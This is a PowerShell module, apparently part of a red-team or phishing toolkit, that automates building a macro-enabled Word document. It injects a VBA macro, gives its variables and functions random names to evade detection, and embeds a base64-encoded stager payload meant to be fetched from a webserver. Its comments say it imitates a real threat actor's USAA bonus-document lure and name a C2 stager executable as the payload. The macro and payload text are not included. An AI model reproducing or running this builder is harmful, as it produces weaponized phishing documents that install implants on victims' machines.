Import-Module $PSScriptRoot\..\..\internals\utils.psm1

<#

This module is based on a tweet from @JohnLaTwC in which the threat actor used the
pretext of a USAA bonus document

Sample hash: 7257da9496e127b899ce8bc6f72bff7a4ac478060ae1283f35eb1a20a5d977de

In order to use this module, ensure that you base64 encode your payload and output it
to a file. 

Example:
    base64 GruntStager.exe > test.txt

This file will need to be placed on a webserver and called

#>

function Build() {
    param(
        [Parameter(mandatory=$true)]
        [String]
        $out,

        [Parameter(mandatory=$false)]
        [String]
        $pass
    )

    SetAuthor

    $wdApp = New-Object -COMObject "Word.Application"
    $wdApp.Visible = $false

    $fname = "$PSScriptRoot\Doc1.docm"

    $wdDoc = $wdApp.documents.open($fname)

    $vbaModule = $wdDoc.VBProject.VBComponents.Add(1)

    $macro = BuildMacro
    $vbaModule.CodeModule.AddFromString($macro) | Out-Null

    # 13 is needed for docm
    # https://docs.microsoft.com/en-us/office/vba/api/Word.WdSaveFormat
    if (!$pass) {
        $wdDoc.SaveAs($out, 13)
        $wdDoc.Close()
        $wdApp.Quit()
    } else {
        $wdDoc.SaveAs($out, 13, 0, $pass)
        $wdDoc.Close()
        $wdApp.Quit()
    } 

    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdDoc) | Out-Null
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdApp) | Out-Null
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()

    Remove-Variable wdDoc
    Remove-Variable wdApp
    
}

function BuildMacro() {

    $macro = [System.IO.File]::ReadAllText("$PSScriptRoot\macro.txt")
    $payload = [System.IO.File]::ReadAllText("$PSScriptRoot\payloads.txt")

    $var_counter = 1
    do {
        $this_var_name = "aVAR" + $var_counter + "a"
        $randName = RandTextAlpha -len 15
        if ($macro.contains($this_var_name)) {
            $macro = $macro -replace $this_var_name, $randName
        } else {
            break
        }
        $var_counter++
    } while ($true)

    $var_counter = 1
    do {
        $this_var_name = "aFUNC" + $var_counter + "a"
        $randName = RandTextAlpha -len 15
        if ($macro.contains($this_var_name)) {
            $macro = $macro -replace $this_var_name, $randName
        } else {
            break
        }
        $var_counter++
    } while ($true)

    $macro = $macro -replace "aPAYLOADa", $payload
  
    return $macro

}